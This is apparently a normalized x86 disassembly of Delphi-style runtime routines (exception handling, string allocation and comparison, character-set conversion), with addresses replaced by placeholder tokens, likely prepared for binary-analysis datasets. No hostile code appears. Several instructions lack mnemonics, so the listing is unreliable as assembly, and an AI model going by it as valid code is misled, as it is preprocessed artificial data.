inc edx
call sub_402c34
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4039d0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_4036b8
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403a08
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403fc0
sub_403a30
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405dbc
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403294
call sub_403618
sub_403a84
call sub_405dbc
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403294
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4036e0
jmp edx
sub_403acc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027e8
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403c2c
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403c54
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c9a
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403cb4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403cfa
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403d54
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405b50
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d78
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405b50
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403da0
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403dc4
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403e20
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403e50
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_401254
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_40120c
push eax
call sub_40122c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_40120c
push eax
call sub_40122c
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403edc
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403dc4
call sub_403e50
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403c54
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403c2c
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_40561c
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403e20
push eax
call sub_40126c
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403fcc
push ebp
mov ebp esp
call sub_4031d0
push ebp
xor ecx ecx
push r-xdata
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_402704
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_404004
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0x8
call sub_4026e4
mov [ eax ] edi
mov edx [ ebp + 0x10 ]
mov [ eax + 0x4 ] edx
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_403fcc
push eax
push esi
push ebx
call sub_40123c
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_404050
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_402704
pop eax
sub_404074
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402704
sub_4040a4
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404114
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028e0
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402704
sub_4040e8
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402704
sub_404114
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026e4
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_404140
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404114
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_404050
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028e0
sub_404170
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404190
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_4041ac
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404050
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_40469c
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404170
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404170
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_40469c
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404140
jmp r-xdata
sub_404248
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404140
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404278
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4041ac
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4042c0
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404140
not ecx
sub_4042ec
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028e0
pop ebx
retn
mov ecx ebx
sub_404318
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_4040a4
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_40469c
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_40469c
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028e0
pop edi
pop esi
pop ebx
retn
sub_40435c
test edx edx
je r-xdata
mov edx ecx
jmp sub_4040a4
test ecx ecx
je sub_4040a4
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404318
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404114
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028e0
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028e0
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_4040a4
pop edx
pop eax
jmp sub_404318
call sub_4040a4
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4043d0
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404114
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_40469c
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028e0
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_4040a4
dec [ edx - 0x8 ]
sub_40445c
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_40451c
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404114
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028e0
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_402704
sub_404570
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_404050
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_404140
jmp r-xdata
pop ebx
retn 0x4
sub_4045b0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_40451c#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028e0
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_40469c
mov edi ecx
sub_4045f8
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_40469c
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028e0
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028e0
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_404654
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_40469c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_404050
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404114
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_402724
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028e0
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404748
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_40476c
test edx edx
je sub_404730
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404730
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402840
retn
sub_404790
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404730
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404978
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404190
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404190
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404978
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_40481c
jmp r-xdata
sub_40481c
test ecx ecx
je sub_404730
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402840
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_404840
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40481c
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4048a8
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_40492c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_40489c
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_40481c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404978
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404720
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404708
mov ebx eax
mov eax [ edi ]
call sub_40489c
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028e0
mov eax esi
sub_4049bc
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4049ec
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_4049ec
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_4049ec
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4049bc
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402840
sub_404a80
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404acc
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404acc
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_404074
jmp r-xdata
call sub_404050
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404748
jmp r-xdata
call sub_404730
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404ab4
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404acc
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404a80
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_40568c
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_404fe0
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402840
sub_404bdc
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028e0
mov edx [ eax + esi ]
add eax ebx
call sub_4040a4
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_40476c
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
